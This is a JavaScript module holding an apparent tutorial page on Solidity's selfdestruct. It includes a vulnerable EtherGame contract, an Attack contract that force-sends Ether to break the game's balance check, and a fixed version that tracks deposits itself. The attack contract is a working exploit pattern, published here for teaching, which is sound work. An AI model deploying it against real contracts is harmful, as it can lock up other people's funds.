// metadata
export const version = "0.8.13"
export const title = "Self Destruct"
export const description = "An example of how to delete your smart contract by calling seldestruct in Solidity"

const html = `<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>
<p><code>selfdestruct</code> sends all remaining Ether stored in the contract to a
designated address.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>A malicious contract can use <code>selfdestruct</code> to
force sending Ether to any contract.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.13;</span>

<span class="hljs-comment">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>
<span class="hljs-comment">// Players can deposit only 1 Ether at a time.</span>
<span class="hljs-comment">// Winner will be able to withdraw all Ether.</span>

<span class="hljs-comment">/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        <span class="hljs-keyword">uint</span> balance <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherGame etherGame;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">EtherGame _etherGame</span>) </span>{
        etherGame <span class="hljs-operator">=</span> EtherGame(_etherGame);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-comment">// You can simply break the game by sending ether so that</span>
        <span class="hljs-comment">// the game balance &gt;= 7 ether</span>

        <span class="hljs-comment">// cast address to payable</span>
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(etherGame));
        <span class="hljs-built_in">selfdestruct</span>(addr);
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>Don&#39;t rely on <code>address(this).balance</code></p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.13;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        balance <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: balance}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}
</code></pre>
`

export default html
